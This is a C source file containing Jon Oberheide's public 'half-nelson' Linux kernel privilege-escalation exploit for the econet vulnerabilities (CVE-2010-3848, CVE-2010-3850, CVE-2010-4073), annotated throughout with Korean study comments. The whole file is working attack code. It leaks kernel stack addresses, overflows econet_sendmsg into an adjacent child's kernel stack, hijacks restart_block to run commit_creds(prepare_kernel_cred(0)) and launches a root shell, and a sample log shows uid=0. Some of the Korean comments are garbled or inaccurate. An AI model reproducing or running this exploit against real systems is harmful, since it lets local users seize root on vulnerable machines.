/*
 * half-nelson.c
 * 커널 인접 주소의 타입을 공유 메모리를 오픈해서 구한 뒤 커널 소스코드 중 ~/net/econet/af_econet.c의 econet_sendmsg 함수의 스택 버퍼 오버플로(스택 커널 오버플로우)를
 * 트리거해서 권한 상승해 쉘을 획득하는 함수로 iovec 구조체들의 큰 숫자를 제공하는 것으로 로컬 사용자가 아무나 root가 될 수 있는 버그입니다. (요약본)
 * 커널 메모리 노출도 함께 사용되는데 분석을 하지 않겠다. 보면 되는 정도인 듯?! 본 익스플록은 3개 취약성을 이용했지만, 커널 스택 오버플로 위하는 취약성이 아니라면 익스플로잇되지 못한다.
 * 하이브리드 어택이라고 알아두시면 되시죠?!!! (혼합 공격)
 *
 * Linux Kernel < 2.6.36.2 Econet Privilege Escalation Exploit
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 * 
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3848
 *
 *   Stack-based buffer overflow in the econet_sendmsg function in 
 *   net/econet/af_econet.c in the Linux kernel before 2.6.36.2, when an 
 *   econet address is configured, allows local users to gain privileges by 
 *   providing a large number of iovec structures.
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3850
 *
 *   The ec_dev_ioctl function in net/econet/af_econet.c in the Linux kernel 
 *   before 2.6.36.2 does not require the CAP_NET_ADMIN capability, which 
 *   allows local users to bypass intended access restrictions and configure 
 *   econet addresses via an SIOCSIFADDR ioctl call.
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4073
 *
 *   The ipc subsystem in the Linux kernel before 2.6.37-rc1 does not 
 *   initialize certain structures, which allows local users to obtain 
 *   potentially sensitive information from kernel stack memory.
 *
 * Usage:
 *
 *   $ gcc half-nelson.c -o half-nelson -lrt
 *   $ ./half-nelson
 *   [+] looking for symbols... 심볼 얻기함수 실행 결과로 아래 64비트 3가지 함수 commit_creds, prepare_kernel_cred, ia32_sysret 함수 주소 얻어온다
 *   [+] resolved symbol commit_creds to 0xffffffff81088ad0
 *   [+] resolved symbol prepare_kernel_cred to 0xffffffff81088eb0
 *   [+] resolved symbol ia32_sysret to 0xffffffff81046692
 *       // 인접이 아니라 어전트 커널 스택 메모리를 자식이 획득한다
 *   [+] spawning children to achieve adjacent kstacks...
 *       // 아래는 읽어보시고 분석하셔야 한다. ***
 *   [+] found parent kstack at 0xffff88001c6ca000
 *   [+] found adjacent children kstacks at 0xffff88000d10a000 and 0xffff88000d10c000
 *   [+] lower child spawning a helper...
 *   [+] lower child calling compat_sys_wait4 on helper… // 커널 스택 오버플로 취약점을 악용하며, 이 취약점을 트리거하기위해서 compat_sys_wait4를 호출
 *   [+] helper going to sleep... // 헬퍼가 무한루프
 *   [+] upper child triggering stack overflow... // 상위 차일드(자식이 아니라)이 스택 오버플로를 트리거(시도 익스플록)
 *   [+] helper woke up // 헬퍼 꺠운
 *   [+] lower child returned from compat_sys_wait4
 *   [+] parent's restart_block has been clobbered // 부모의 restart_block이 클로버링(획득 루트)된 상태인…
 *   [+] escalating privileges... // 특권 상승 시도
 *   [+] launching root shell! // 루트쉘 실행
 *   # id
 *   uid=0(root) gid=0(root) // 동작하는 취약점이란걸 위의 로그와 코드를 분석해 보고 돌려보시면 알 수 있습니다****
 *
 * Notes: // 우분투 10.04 LTS (2.6.32-21-generic) 커널 기본 버전에서 동작하니까 64비트로 설치하셔서 돌려보세요. 다른 테스트베드늘리실 필욘 없으십니다 ***** 시간낭비하시는 거인,.
 *
 *   This exploit leverages three vulnerabilities to escalate privileges. 
 *   The primary vulnerability is a kernel stack overflow, not a stack buffer 
 *   overflow as the CVE description incorrectly states. I believe this is the
 *   first public exploit for a kernel stack overflow, and it turns out to be 
 *   a bit tricky due to some particulars of the econet vulnerability. A full 
 *   breakdown of the exploit is forthcoming.
 *
 *   Tested on Ubuntu 10.04 LTS (2.6.32-21-generic).
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <syscall.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <net/if.h>

#define IOVS           446
#define NPROC          1024
#define KSTACK_SIZE    8192

#define KSTACK_UNINIT  0
#define KSTACK_UPPER   1
#define KSTACK_LOWER   2
#define KSTACK_DIE     3
#define KSTACK_PARENT  4
#define KSTACK_CLOBBER 5

#define LEAK_BASE      0xffff880000000000
#define LEAK_TOP       0xffff8800c0000000
#define LEAK_DEPTH     500
#define LEAK_OFFSET    32 

#define NR_IPC         0x75
#define NR_WAIT4       0x72
#define SEMCTL         0x3

#ifndef PF_ECONET
#define PF_ECONET      19
#endif

#define STACK_OFFSET   6
#define RESTART_OFFSET 40

struct ec_addr {
	unsigned char station;
	unsigned char net;
};

struct sockaddr_ec {
	unsigned short sec_family;
	unsigned char port;
	unsigned char cb;
	unsigned char type;
	struct ec_addr addr;
	unsigned long cookie;
};

struct ipc64_perm {
	uint32_t key;
	uint32_t uid;
	uint32_t gid;
	uint32_t cuid;
	uint32_t cgid;
	uint32_t mode;
	uint16_t seq;
	uint16_t __pad2;
	unsigned long __unused1;
	unsigned long __unused2;
};

struct semid64_ds {
	struct ipc64_perm sem_perm;
	unsigned long sem_otime;
	unsigned long __unused1;
	unsigned long sem_ctime;
	unsigned long __unused;
	unsigned long sem_nsems;
	unsigned long __unused3;
	unsigned long __unused4;
};

union semun {
	int val;
	struct semid_ds *buf;
	unsigned short *array;
	struct seminfo *__buf;
};

struct region { // 커널 메모리를 프로세스별로 주소를 구하기 위해서. addrs변수를 두고 NPROC 상수 정의문만큼 프로세스를 반복해서 점검하기 위한 메모리 레이지온(영역자리) 표시기인,.
	unsigned long parent;
	unsigned long addrs[NPROC];
};
struct region *region;

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long ia32_sysret;
 
// 커널 특권을 현재 프로세스에 주는 심볼 구한 함수 호출하는 kernel_code(커널 쉘코딩)
void __attribute__((regparm(3))) kernel_code(void)
{
	commit_creds(prepare_kernel_cred(0)); // 이 부분이 task_struct current 현재 프로세스 태스크에 uid, gid, euid등을 0으로해서 super로 바꿔주는 특권 상승 기능인,. — 쉬운!
}

// 부모 페이로드는 $kernel_code(위 함수 주소)를  %rax레지스터(시퓨상)에 저장하고, %rax를 호출해서 커널 코드 실행하는 트램폴린
void payload_parent(void)
{
	asm volatile (
		"mov $kernel_code, %rax\n"
		"call *%rax\n"
	);
}

// 자식 프로세스의 페이로드는 위의 $payload_parent 를 RESTART_BLOCK 함수의 오프셋으로 ia32_sysret 코드로 점프도도록 함.
// ia32_sysret 커널 함수를 구해서 호출한 결과론 payload_parent 커널 쉘코드가 수행될 예정이라고 선언된 어셈블리 코드입니다. (예 커널코드는 익스플로될떄 어셈블리를 쓰죠?아셔야게쩌?) x64입니다.
void payload_child(void)
{
	asm volatile (
		"movq $payload_parent, (%0)\n"
		"jmpq *%1\n"
		:
		: "r"(region->parent + RESTART_OFFSET), "r"(ia32_sysret)
	);
}

// 커널 스택 주소 얻기
unsigned long get_kstack(void)
{
	int i, size, offset;
	union semun *arg;
	struct semid_ds dummy;
	struct semid64_ds *leaked;
	char *stack_start, *stack_end;
	unsigned char *p;
	unsigned long kstack, *ptr;

	/* make sure our argument is 32-bit accessible */
	arg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_32BIT, -1, 0);
	if (arg == MAP_FAILED) {
		printf("[-] failure mapping memory, aborting!\n");
		exit(1);
	}

	/* map a fake stack to use during syscall */
        // 스택 메모리를 MAP_32BIT로 둬서 32비트로 설정한 듯 보인, 익명 매핑이고, 개인 매핑, 읽기 |쓰기 가능하도록 설정한후  NULL(0x0 널주소)에 가상 메모리 4096(4page) 할당
	stack_start = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_32BIT, -1, 0);
	if (stack_start == MAP_FAILED) {
		printf("[-] failure mapping memory, aborting!\n");
		exit(1);
	}
	stack_end = stack_start + 4096; // 커널 스택 종료 지점 0x4096 주소인(낮은 가상 메모리 주소를 말한,-

	memset(arg, 0, sizeof(union semun));
	memset(&dummy, 0, sizeof(struct semid_ds));
	arg->buf = &dummy;

	/* syscall(NR_IPC, SEMCTL, 0, 0, IPC_SET, arg) */ // NR_IPC  시스템콜과 SEMCTL 속성으로 메모리를 거져온
	asm volatile (
		"push %%rax\n"
		"push %%rbx\n"
		"push %%rcx\n"
		"push %%rdx\n"
		"push %%rsi\n"
		"push %%rdi\n"
		"movl %0, %%eax\n"
		"movl %1, %%ebx\n"
		"movl %2, %%ecx\n"
		"movl %3, %%edx\n"
		"movl %4, %%esi\n"
		"movq %5, %%rdi\n"
		"movq %%rsp, %%r8\n"
		"movq %6, %%rsp\n"
		"push %%r8\n"
		"int $0x80\n"
		"pop %%r8\n"
		"movq %%r8, %%rsp\n"
		"pop %%rdi\n"
		"pop %%rsi\n"
		"pop %%rdx\n"
		"pop %%rcx\n"
		"pop %%rbx\n"
		"pop %%rax\n"
		:
		: "r"(NR_IPC), "r"(SEMCTL), "r"(0), "r"(0), "r"(IPC_SET), "r"(arg), "r"(stack_end)
		: "memory", "rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8"
	);

	/* naively extract a pointer to the kstack from the kstack */
	p = stack_end - (sizeof(unsigned long) + sizeof(struct semid64_ds)) + LEAK_OFFSET;  // sesmid64_ds 구조의 LEAK_OFFSET 위치 선점
	kstack = *(unsigned long *) p; // 커널 스택 구한…

	if (kstack < LEAK_BASE || kstack > LEAK_TOP) {
		printf("[-] failed to leak a suitable kstack address, try again!\n");
		exit(1);
	}
	if ((kstack % 0x1000) < (0x1000 - LEAK_DEPTH)) {
		printf("[-] failed to leak a suitable kstack address, try again!\n");
		exit(1);
	}

	kstack = kstack & ~0x1fff; // 커널 스택을 0x1fff 2바이트 중 하위 두 바이트와. 0x1f 하위바로옆의 부분정도만 마스킹해서 커널 스택으로 만들어 아래에서 반환한,.
	
	return kstack;
}

// 카널 심볼 얻기 (/proc/kallsyms에서.텍스트로 읽어와서 파싱한.
unsigned long get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sym[512];
	int ret = 0;
 
	f = fopen("/proc/kallsyms", "r");
	if (!f) {
		return 0;
	}
 
	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
		if (ret == 0) {
			fscanf(f, "%s\n", sym);
			continue;
		}
		if (!strcmp(name, sym)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);
 
	return 0;
}

int get_adjacent_kstacks(void)
{
	int i, ret, shm, pid, type;

        // 공유 메모리로 커널 인접한 곳을 얻어서(커널 주소)에 따라 주소의 위치에 대한 타입을 반환하는 기능을 아래에서 구현해 놓아따.
	/* create shared communication channel between parent and its children */
	shm = shm_open("/halfnelson", O_RDWR | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
	if (shm < 0) {
		printf("[-] failed creating shared memory, aborting!\n");
		exit(1);
	}

	ret = ftruncate(shm, sizeof(struct region));
	if (ret != 0) {
		printf("[-] failed resizing shared memory, aborting!\n");
		exit(1);
	}

	region = mmap(NULL, sizeof(struct region), PROT_READ | PROT_WRITE, MAP_SHARED, shm, 0);
	memset(region, KSTACK_UNINIT, sizeof(struct region));

	/* parent kstack self-discovery */
	region->parent = get_kstack();

	printf("[+] found parent kstack at 0x%lx\n", region->parent);

	/* fork and discover children with adjacently-allocated kernel stacks */
	for (i = 0; i < NPROC; ++i) {
		pid = fork();

		if (pid > 0) {
			type = KSTACK_PARENT;
			continue;
		} else if (pid == 0) {
			/* children do kstack self-discovery */
			region->addrs[i] = get_kstack();

			/* children sleep until parent has found adjacent children */
			while (1) {
				sleep(1);
				if (region->addrs[i] == KSTACK_DIE) {
					/* parent doesn't need us :-( */
					exit(0);
				} else if (region->addrs[i] == KSTACK_UPPER) {
					/* we're the upper adjacent process */
					type = KSTACK_UPPER;
					break;
				} else if (region->addrs[i] == KSTACK_LOWER) {
					/* we're the lower adjacent process */
					type = KSTACK_LOWER;
					break;
				}
			}
			break;
		} else {
			printf("[-] fork failed, aborting!\n");
			exit(1);
		}
	}

	return type;
}

// 페어런트가 실행하는 함수
void do_parent(void)
{
	int i, j, upper, lower;

	/* parent sleeps until we've discovered all the child kstacks */
	while (1) {
		sleep(1);
		for (i = 0; i < NPROC; ++i) {
			if (region->addrs[i] == KSTACK_UNINIT) {
				break;
			}
		}
		if (i == NPROC) {
			break;
		}
	}

	/* figure out if we have any adjacent child kstacks */
	for (i = 0; i < NPROC; ++i) {
		for (j = 0; j < NPROC; ++j) {
			if (region->addrs[i] == region->addrs[j] + KSTACK_SIZE) {
				break;
			}
		}
		if (j != NPROC) {
			break;
		}
	}
	if (i == NPROC && j == NPROC) {
		printf("[-] failed to find adjacent kstacks, try again!\n");
		exit(1);
	}

	upper = i;
	lower = j;

	printf("[+] found adjacent children kstacks at 0x%lx and 0x%lx\n", region->addrs[lower], region->addrs[upper]);

	/* signal to non-adjacent children to die */
	for (i = 0; i < NPROC; ++i) {
		if (i != upper && i != lower) {
			region->addrs[i] = KSTACK_DIE;
		}
	}

	/* signal adjacent children to continue on */
	region->addrs[upper] = KSTACK_UPPER;
	region->addrs[lower] = KSTACK_LOWER;

	/* parent sleeps until child has clobbered the fptr */
	while (1) {
		sleep(1);
		if (region->parent == KSTACK_CLOBBER) {
			break;
		}
	}

	printf("[+] escalating privileges...\n");

	/* trigger our clobbered fptr */
	syscall(__NR_restart_syscall);

	/* our privileges should be escalated now */
	if (getuid() != 0) {
		printf("[-] privilege escalation failed, aborting!\n");
		exit(1);
	}

	printf("[+] launching root shell!\n");

	execl("/bin/sh", "/bin/sh", NULL);
}

// 자식 프로세스의 상향 주소에서 실행하는 함수
void do_child_upper(void)
{
	int i, ret, eco_sock;
	struct sockaddr_ec eco_addr;
	struct msghdr eco_msg;
	struct iovec iovs[IOVS];
	struct ifreq ifr;
	char *target;

	/* calculate payload target, skip prologue */
	target = (char *) payload_child;
	target += 4;
	
	/* give lower child a chance to enter its wait4 call */
	sleep(1);

	/* write some zeros */
	for (i = 0; i < STACK_OFFSET; ++i) {
		iovs[i].iov_base = (void *) 0x0;
		iovs[i].iov_len = 0;
	}

	/* overwrite saved ia32_sysret address on stack */
	iovs[STACK_OFFSET].iov_base = (void *) target;
	iovs[STACK_OFFSET].iov_len = 0x0246;

	/* force abort via EFAULT */
	for (i = STACK_OFFSET + 1; i < IOVS; ++i) {
		iovs[i].iov_base = (void *) 0xffffffff00000000;
		iovs[i].iov_len = 0;
	}

	/* create econet socket */ // 스택 오버플로에 취약한.ECONET 소켓 패밀리를 호출,. (취약성 발생)
	eco_sock = socket(PF_ECONET, SOCK_DGRAM, 0);
	if (eco_sock < 0) {
		printf("[-] failed creating econet socket, aborting!\n");
		exit(1);
	}

	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, "lo");

	/* trick econet into associated with the loopback */
	ret = ioctl(eco_sock, SIOCSIFADDR, &ifr);
	if (ret != 0) {
		printf("[-] failed setting interface address, aborting!\n");
		exit(1);
	}

	memset(&eco_addr, 0, sizeof(eco_addr));
	memset(&eco_msg, 0, sizeof(eco_msg));
	eco_msg.msg_name = &eco_addr;
	eco_msg.msg_namelen = sizeof(eco_addr);
	eco_msg.msg_flags = 0;
	eco_msg.msg_iov = &iovs[0]; // 취약성 공격을 위한 상단에 설명드린 ions (io vectors) 구조체를 에코넷에 설치
	eco_msg.msg_iovlen = IOVS;

	printf("[+] upper child triggering stack overflow...\n");

	/* trigger the kstack overflow into lower child's kstack */
	ret = sendmsg(eco_sock, &eco_msg, 0); // 커널 스택 오버플로를 로우(낮은) 자식의 커널 스택에 트리거하기 위해서 데이타그램을 하나 에코넷 패밀리로 전송
	if (ret != -1 || errno != EFAULT) {
		printf("[-] sendmsg succeeded unexpectedly, aborting!\n");
		exit(1);
	}

	close(eco_sock); // 소켓 닫기
}

// 자식 프로세스의 낮은 주소가 실행하는 함수
void do_child_lower(void)
{
	int pid;

	printf("[+] lower child spawning a helper...\n");

	/* fork off a helper to wait4 on */
	pid = fork();
	if (pid == 0) {
		printf("[+] helper going to sleep...\n");
		sleep(5);
		printf("[+] helper woke up\n");
		exit(1);
	}

	printf("[+] lower child calling compat_sys_wait4 on helper...\n");

	/* syscall(NR_WAIT4, pid, 0, 0, 0) */ // NR_WAIT4 시스템 콜을 호출
	asm volatile (
		"push %%rax\n"
		"push %%rbx\n"
		"push %%rcx\n"
		"push %%rdx\n"
		"push %%rsi\n"
		"movl %0, %%eax\n"
		"movl %1, %%ebx\n"
		"movl %2, %%ecx\n"
		"movl %3, %%edx\n"
		"movl %4, %%esi\n"
		"int $0x80\n"
		"pop %%rsi\n"
		"pop %%rdx\n"
		"pop %%rcx\n"
		"pop %%rbx\n"
		"pop %%rax\n"
		:
		: "r"(NR_WAIT4), "r"(pid), "r"(0), "r"(0), "r"(0)
		: "memory", "rax", "rbx", "rcx", "rdx", "rsi"
	);

	printf("[+] lower child returned from compat_sys_wait4\n");

	printf("[+] parent's restart_block has been clobbered\n");

	/* signal parent that our fptr should now be clobbered */
	region->parent = KSTACK_CLOBBER;
}

// 엔트리 포인터
int main(int argc, char **argv)
{
	int type;

	if (sizeof(unsigned long) != 8) {
		printf("[-] x86_64 only, sorry!\n");
		exit(1);
	}

// (1-1) 심볼 구하기
	printf("[+] looking for symbols...\n");
 
	commit_creds = (_commit_creds) get_symbol("commit_creds");
	if (!commit_creds) {
		printf("[-] symbol table not available, aborting!\n");
		exit(1);
	}
 
	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
	if (!prepare_kernel_cred) {
		printf("[-] symbol table not available, aborting!\n");
		exit(1);
	}

	ia32_sysret = get_symbol("ia32_sysret");
	if (!ia32_sysret) {
		printf("[-] symbol table not available, aborting!\n");
		exit(1);
	}

       // 익스플로잇 메인코드열 (아래의 3 함수를 한번에 한 개만 호출하고 있다* )
	printf("[+] spawning children to achieve adjacent kstacks...\n");

	type = get_adjacent_kstacks(); // 어전트 커널 스택 메모리의 타입을 구하는 함수 호출!!!

	if (type == KSTACK_PARENT) { // 커널 부모 스택인 경우, do_parent() 호출!!!
		do_parent();
	} else if (type == KSTACK_UPPER) { // 자식의 커널 상위 인 경우, do_child_upper() 호출!!!
		do_child_upper();
	} else if (type == KSTACK_LOWER) { // 자식의 하위 인 경우, do_child_lower() 호출!!!
		do_child_lower();
	}

	return 0; // 실패시 0을 반환
}
